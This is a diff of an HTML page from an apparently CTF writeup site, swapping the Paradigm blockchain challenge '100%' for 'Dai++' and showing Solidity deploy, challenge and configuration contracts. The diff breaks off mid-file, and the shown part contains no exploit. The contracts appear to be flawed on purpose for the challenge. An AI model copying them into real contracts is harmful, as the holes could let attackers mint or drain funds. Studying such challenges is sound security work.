@@ -12,14 +12,14 @@
         <meta name="author" content="YanhuiJessica">
       
       
-        <link rel="canonical" href="https://yanhuijessica.github.io/Chictf-Writeups/blockchain/paradigm/one_hundred_percent/">
+        <link rel="canonical" href="https://yanhuijessica.github.io/Chictf-Writeups/blockchain/paradigm/dai_plus_plus/">
       
       <link rel="icon" href="../../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.5.3, mkdocs-material-8.3.3">
     
     
       
-        <title>Blockchain - 100% - Chictf-Writeups</title>
+        <title>Blockchain - Dai++ - Chictf-Writeups</title>
       
     
     
@@ -113,7 +113,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Blockchain - 100%
+              Blockchain - Dai++
             
           </span>
         </div>
@@ -2634,6 +2634,20 @@
               
   
   
+  
+    <li class="md-nav__item">
+      <a href="../one_hundred_percent/" class="md-nav__link">
+        100%
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
     
   
   
@@ -2644,12 +2658,12 @@
       
       
         <label class="md-nav__link md-nav__link--active" for="__toc">
-          100%
+          Dai++
           <span class="md-nav__icon md-icon"></span>
         </label>
       
       <a href="./" class="md-nav__link md-nav__link--active">
-        100%
+        Dai++
       </a>
       
         
@@ -2703,20 +2717,6 @@
   
 </nav>
       
-    </li>
-  
-
-            
-          
-            
-              
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../dai_plus_plus/" class="md-nav__link">
-        Dai++
-      </a>
     </li>
   
 
@@ -3411,22 +3411,20 @@
 
   
                 
-  <a href="https://github.com/YanhuiJessica/Chictf-Writeups/edit/master/docs/blockchain/paradigm/one_hundred_percent.md" title="编辑此页" class="md-content__button md-icon">
+  <a href="https://github.com/YanhuiJessica/Chictf-Writeups/edit/master/docs/blockchain/paradigm/dai_plus_plus.md" title="编辑此页" class="md-content__button md-icon">
     <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25Z"/></svg>
   </a>
 
 
 
-  <h1>100%</h1>
+  <h1>Dai++</h1>
 
 <div class="md-typeset">
     <div class="blogging-tags-grid">
 
         <a href="#smart contract" class="blogging-tag"><code>#smart contract</code></a>
 
-        <a href="#abi.encodePacked" class="blogging-tag"><code>#abi.encodePacked</code></a>
-
-        <a href="#collisions" class="blogging-tag"><code>#collisions</code></a>
+        <a href="#clones with immutable args" class="blogging-tag"><code>#clones with immutable args</code></a>
 
     </div>
 
@@ -3454,7 +3452,7 @@
     }
 </style>
 <h2 id="description">Description<a class="headerlink" href="#description" title="Permanent link">&para;</a></h2>
-<p>Your funds are safe when you use our innovative new payment splitter that ensure that 100% of assets make it to their intended recipients.</p>
+<p>MakerDAO is such a complex codebase, and we all know that larger codebases are more likely to have bugs. I simplified everything, so there shouldn't be any bugs here.</p>
 <details class="note">
 <summary>Deploy.s.sol</summary>
 <div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: UNLICENSED</span>
@@ -3462,28 +3460,25 @@
 
 <span class="k">import</span><span class="w"> </span><span class="s2">&quot;forge-ctf/CTFDeployment.sol&quot;</span><span class="p">;</span>
 
-<span class="k">import</span><span class="w"> </span><span class="s2">&quot;src/Split.sol&quot;</span><span class="p">;</span>
-<span class="k">import</span><span class="w"> </span><span class="s2">&quot;src/Challenge.sol&quot;</span><span class="p">;</span>
+<span class="k">import</span><span class="w"> </span><span class="s2">&quot;../src/Challenge.sol&quot;</span><span class="p">;</span>
+<span class="k">import</span><span class="w"> </span><span class="s2">&quot;../src/SystemConfiguration.sol&quot;</span><span class="p">;</span>
+<span class="k">import</span><span class="w"> </span><span class="p">{</span><span class="nx">Account</span><span class="w"> </span><span class="kr">as</span><span class="w"> </span><span class="nx">Acct</span><span class="p">}</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="s2">&quot;../src/Account.sol&quot;</span><span class="p">;</span>
 
 <span class="nx">contract</span><span class="w"> </span><span class="nx">Deploy</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">CTFDeployment</span><span class="w"> </span><span class="p">{</span>
 <span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">deploy</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">system</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="p">)</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="nx">override</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">challenge</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
 <span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">startBroadcast</span><span class="p">(</span><span class="nx">system</span><span class="p">);</span>
 
-<span class="w">        </span><span class="nx">Split</span><span class="w"> </span><span class="nx">split</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">Split</span><span class="p">();</span>
+<span class="w">        </span><span class="nx">SystemConfiguration</span><span class="w"> </span><span class="nx">configuration</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">SystemConfiguration</span><span class="p">();</span>
+<span class="w">        </span><span class="nx">AccountManager</span><span class="w"> </span><span class="nx">manager</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">AccountManager</span><span class="p">(</span><span class="nx">configuration</span><span class="p">);</span>
 
-<span class="w">        </span><span class="nx">address</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">addrs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">address</span><span class="p">[](</span><span class="mf">2</span><span class="p">);</span>
-<span class="w">        </span><span class="nx">addrs</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="mh">0x000000000000000000000000000000000000dEaD</span><span class="p">);</span>
-<span class="w">        </span><span class="nx">addrs</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="mh">0x000000000000000000000000000000000000bEEF</span><span class="p">);</span>
-<span class="w">        </span><span class="nx">uint32</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">percents</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">uint32</span><span class="p">[](</span><span class="mf">2</span><span class="p">);</span>
-<span class="w">        </span><span class="nx">percents</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">5e5</span><span class="p">;</span>
-<span class="w">        </span><span class="nx">percents</span><span class="p">[</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">5e5</span><span class="p">;</span>
+<span class="w">        </span><span class="nx">configuration</span><span class="p">.</span><span class="nx">updateAccountManager</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">manager</span><span class="p">));</span>
+<span class="w">        </span><span class="nx">configuration</span><span class="p">.</span><span class="nx">updateStablecoin</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="ow">new</span><span class="w"> </span><span class="nx">Stablecoin</span><span class="p">(</span><span class="nx">configuration</span><span class="p">)));</span>
+<span class="w">        </span><span class="nx">configuration</span><span class="p">.</span><span class="nx">updateAccountImplementation</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="ow">new</span><span class="w"> </span><span class="nx">Acct</span><span class="p">()));</span>
+<span class="w">        </span><span class="nx">configuration</span><span class="p">.</span><span class="nx">updateEthUsdPriceFeed</span><span class="p">(</span><span class="mh">0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419</span><span class="p">);</span>
 
-<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">split</span><span class="p">.</span><span class="nx">createSplit</span><span class="p">(</span><span class="nx">addrs</span><span class="p">,</span><span class="w"> </span><span class="nx">percents</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span>
+<span class="w">        </span><span class="nx">configuration</span><span class="p">.</span><span class="nx">updateSystemContract</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">manager</span><span class="p">),</span><span class="w"> </span><span class="kc">true</span><span class="p">);</span>
 
-<span class="w">        </span><span class="nx">Split</span><span class="p">.</span><span class="nx">SplitData</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">splitData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">split</span><span class="p">.</span><span class="nx">splitsById</span><span class="p">(</span><span class="nx">id</span><span class="p">);</span>
-<span class="w">        </span><span class="nx">splitData</span><span class="p">.</span><span class="nx">wallet</span><span class="p">.</span><span class="nx">deposit</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="mf">100</span><span class="w"> </span><span class="nx">ether</span><span class="p">}();</span>
-
-<span class="w">        </span><span class="nx">challenge</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="ow">new</span><span class="w"> </span><span class="nx">Challenge</span><span class="p">(</span><span class="nx">split</span><span class="p">));</span>
+<span class="w">        </span><span class="nx">challenge</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="ow">new</span><span class="w"> </span><span class="nx">Challenge</span><span class="p">(</span><span class="nx">configuration</span><span class="p">));</span>
 
 <span class="w">        </span><span class="nx">vm</span><span class="p">.</span><span class="nx">stopBroadcast</span><span class="p">();</span>
 <span class="w">    </span><span class="p">}</span>
@@ -3495,340 +3490,373 @@
 <div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: UNLICENSED</span>
 <span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.13</span><span class="p">;</span>
 
-<span class="k">import</span><span class="w"> </span><span class="s2">&quot;../lib/openzeppelin-contracts/contracts/token/ERC721/IERC721.sol&quot;</span><span class="p">;</span>
-<span class="k">import</span><span class="w"> </span><span class="s2">&quot;./Split.sol&quot;</span><span class="p">;</span>
+<span class="k">import</span><span class="w"> </span><span class="s2">&quot;../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol&quot;</span><span class="p">;</span>
+<span class="k">import</span><span class="w"> </span><span class="s2">&quot;./SystemConfiguration.sol&quot;</span><span class="p">;</span>
 
 <span class="nx">contract</span><span class="w"> </span><span class="nx">Challenge</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nx">Split</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">immutable</span><span class="w"> </span><span class="nx">SPLIT</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">SystemConfiguration</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">immutable</span><span class="w"> </span><span class="nx">SYSTEM_CONFIGURATION</span><span class="p">;</span>
 
-<span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">Split</span><span class="w"> </span><span class="nx">split</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">SPLIT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">split</span><span class="p">;</span>
+<span class="w">    </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">SystemConfiguration</span><span class="w"> </span><span class="nx">configuration</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">SYSTEM_CONFIGURATION</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">configuration</span><span class="p">;</span>
 <span class="w">    </span><span class="p">}</span>
 
 <span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">isSolved</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">Split</span><span class="p">.</span><span class="nx">SplitData</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">splitData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">SPLIT</span><span class="p">.</span><span class="nx">splitsById</span><span class="p">(</span><span class="mf">0</span><span class="p">);</span>
-
-<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">SPLIT</span><span class="p">).</span><span class="nx">balance</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">splitData</span><span class="p">.</span><span class="nx">wallet</span><span class="p">).</span><span class="nx">balance</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">IERC20</span><span class="p">(</span><span class="nx">SYSTEM_CONFIGURATION</span><span class="p">.</span><span class="nx">getStablecoin</span><span class="p">()).</span><span class="nx">totalSupply</span><span class="p">()</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">1</span><span class="nx">_000_000_000_000</span><span class="w"> </span><span class="nx">ether</span><span class="p">;</span>
 <span class="w">    </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
 </details>
 <details class="note">
-<summary>src/Split.sol</summary>
-<div class="highlight"><pre><span></span><code><span class="k">import</span><span class="w"> </span><span class="s2">&quot;@openzeppelin/contracts/token/ERC20/IERC20.sol&quot;</span><span class="p">;</span>
-<span class="k">import</span><span class="w"> </span><span class="s2">&quot;@openzeppelin/contracts/token/ERC721/ERC721.sol&quot;</span><span class="p">;</span>
-<span class="k">import</span><span class="w"> </span><span class="s2">&quot;@clones-with-immutable-args/src/ClonesWithImmutableArgs.sol&quot;</span><span class="p">;</span>
+<summary>src/SystemConfiguration.sol</summary>
+<div class="highlight"><pre><span></span><code><span class="k">import</span><span class="w"> </span><span class="s2">&quot;@openzeppelin/contracts/access/Ownable.sol&quot;</span><span class="p">;</span>
 
-<span class="k">import</span><span class="w"> </span><span class="s2">&quot;./SplitWallet.sol&quot;</span><span class="p">;</span>
+<span class="k">import</span><span class="w"> </span><span class="s2">&quot;./Account.sol&quot;</span><span class="p">;</span>
 
-<span class="nx">contract</span><span class="w"> </span><span class="nx">Split</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">ERC721</span><span class="p">(</span><span class="s2">&quot;Split&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SPLIT&quot;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nx">using</span><span class="w"> </span><span class="nx">ClonesWithImmutableArgs</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">address</span><span class="p">;</span>
+<span class="nx">contract</span><span class="w"> </span><span class="nx">SystemConfiguration</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">Ownable</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">accountImplementation</span><span class="p">;</span>
 
-<span class="w">    </span><span class="nx">struct</span><span class="w"> </span><span class="nx">SplitData</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">bytes32</span><span class="w"> </span><span class="nx">hash</span><span class="p">;</span>
-<span class="w">        </span><span class="nx">SplitWallet</span><span class="w"> </span><span class="nx">wallet</span><span class="p">;</span>
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">ethUsdPriceFeed</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">accountManager</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nx">address</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">stablecoin</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">collateralRatio</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nx">mapping</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">_systemContracts</span><span class="p">;</span>
+
+<span class="w">    </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">collateralRatio</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">15000</span><span class="p">;</span>
 <span class="w">    </span><span class="p">}</span>
 
-<span class="w">    </span><span class="nx">SplitWallet</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">immutable</span><span class="w"> </span><span class="nx">IMPLEMENTATION</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">SplitWallet</span><span class="p">();</span>
-<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">immutable</span><span class="w"> </span><span class="nx">SCALE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1e6</span><span class="p">;</span>
-
-<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">nextId</span><span class="p">;</span>
-
-<span class="w">    </span><span class="nx">mapping</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">SplitData</span><span class="p">)</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">_splitsById</span><span class="p">;</span>
-
-<span class="w">    </span><span class="nx">mapping</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">mapping</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">uint256</span><span class="p">))</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">balances</span><span class="p">;</span>
-
-<span class="w">    </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">onlySplitOwner</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">splitId</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">_onlySplitOwner</span><span class="p">(</span><span class="nx">splitId</span><span class="p">);</span>
-<span class="w">        </span><span class="nx">_</span><span class="p">;</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">updateAccountImplementation</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">newImplementation</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">accountImplementation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">newImplementation</span><span class="p">;</span>
 <span class="w">    </span><span class="p">}</span>
 
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">_onlySplitOwner</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">splitId</span><span class="p">)</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">ownerOf</span><span class="p">(</span><span class="nx">splitId</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;NOT_SPLIT_OWNER&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">updateEthUsdPriceFeed</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">newPriceFeed</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">ethUsdPriceFeed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">newPriceFeed</span><span class="p">;</span>
 <span class="w">    </span><span class="p">}</span>
 
-<span class="w">    </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">validSplit</span><span class="p">(</span><span class="nx">address</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">accounts</span><span class="p">,</span><span class="w"> </span><span class="nx">uint32</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">percents</span><span class="p">,</span><span class="w"> </span><span class="nx">uint32</span><span class="w"> </span><span class="nx">relayerFee</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">_validSplit</span><span class="p">(</span><span class="nx">accounts</span><span class="p">,</span><span class="w"> </span><span class="nx">percents</span><span class="p">,</span><span class="w"> </span><span class="nx">relayerFee</span><span class="p">);</span>
-<span class="w">        </span><span class="nx">_</span><span class="p">;</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">updateStablecoin</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">newStablecoin</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">stablecoin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">newStablecoin</span><span class="p">;</span>
 <span class="w">    </span><span class="p">}</span>
 
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">_validSplit</span><span class="p">(</span><span class="nx">address</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">accounts</span><span class="p">,</span><span class="w"> </span><span class="nx">uint32</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">percents</span><span class="p">,</span><span class="w"> </span><span class="nx">uint32</span><span class="w"> </span><span class="nx">relayerFee</span><span class="p">)</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">pure</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">accounts</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">percents</span><span class="p">.</span><span class="nx">length</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;MISMATCH_LENGTH&quot;</span><span class="p">);</span>
-
-<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">sum</span><span class="p">;</span>
-<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">accounts</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<span class="w">            </span><span class="nx">sum</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="nx">percents</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
-<span class="w">        </span><span class="p">}</span>
-
-<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">sum</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">SCALE</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;INVALID_PERCENTAGES&quot;</span><span class="p">);</span>
-
-<span class="w">        </span><span class="nx">require</span><span class="p">(</span><span class="nx">relayerFee</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="nx">SCALE</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">10</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;INVALID_RELAYER_FEE&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">updateAccountManager</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">newAccountManager</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">accountManager</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">newAccountManager</span><span class="p">;</span>
 <span class="w">    </span><span class="p">}</span>
 
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">createSplit</span><span class="p">(</span><span class="nx">address</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">accounts</span><span class="p">,</span><span class="w"> </span><span class="nx">uint32</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">percents</span><span class="p">,</span><span class="w"> </span><span class="nx">uint32</span><span class="w"> </span><span class="nx">relayerFee</span><span class="p">)</span>
-<span class="w">        </span><span class="nx">external</span>
-<span class="w">        </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">)</span>
-<span class="w">    </span><span class="p">{</span>
-<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">_createSplit</span><span class="p">(</span><span class="nx">accounts</span><span class="p">,</span><span class="w"> </span><span class="nx">percents</span><span class="p">,</span><span class="w"> </span><span class="nx">relayerFee</span><span class="p">,</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">updateCollateralRatio</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">newRatio</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">collateralRatio</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">newRatio</span><span class="p">;</span>
 <span class="w">    </span><span class="p">}</span>
 
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">createSplitFor</span><span class="p">(</span><span class="nx">address</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">accounts</span><span class="p">,</span><span class="w"> </span><span class="nx">uint32</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">percents</span><span class="p">,</span><span class="w"> </span><span class="nx">uint32</span><span class="w"> </span><span class="nx">relayerFee</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">owner</span><span class="p">)</span>
-<span class="w">        </span><span class="nx">external</span>
-<span class="w">        </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">)</span>
-<span class="w">    </span><span class="p">{</span>
-<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">_createSplit</span><span class="p">(</span><span class="nx">accounts</span><span class="p">,</span><span class="w"> </span><span class="nx">percents</span><span class="p">,</span><span class="w"> </span><span class="nx">relayerFee</span><span class="p">,</span><span class="w"> </span><span class="nx">owner</span><span class="p">);</span>
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">updateSystemContract</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">target</span><span class="p">,</span><span class="w"> </span><span class="nx">bool</span><span class="w"> </span><span class="nx">authorized</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">onlyOwner</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">_systemContracts</span><span class="p">[</span><span class="nx">target</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">authorized</span><span class="p">;</span>
 <span class="w">    </span><span class="p">}</span>
 
-<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">_createSplit</span><span class="p">(</span><span class="nx">address</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">accounts</span><span class="p">,</span><span class="w"> </span><span class="nx">uint32</span><span class="p">[]</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">percents</span><span class="p">,</span><span class="w"> </span><span class="nx">uint32</span><span class="w"> </span><span class="nx">relayerFee</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">owner</span><span class="p">)</span>
-<span class="w">        </span><span class="kr">private</span>
-<span class="w">        </span><span class="nx">validSplit</span><span class="p">(</span><span class="nx">accounts</span><span class="p">,</span><span class="w"> </span><span class="nx">percents</span><span class="p">,</span><span class="w"> </span><span class="nx">relayerFee</span><span class="p">)</span>
-<span class="w">        </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="p">)</span>
-<span class="w">    </span><span class="p">{</span>
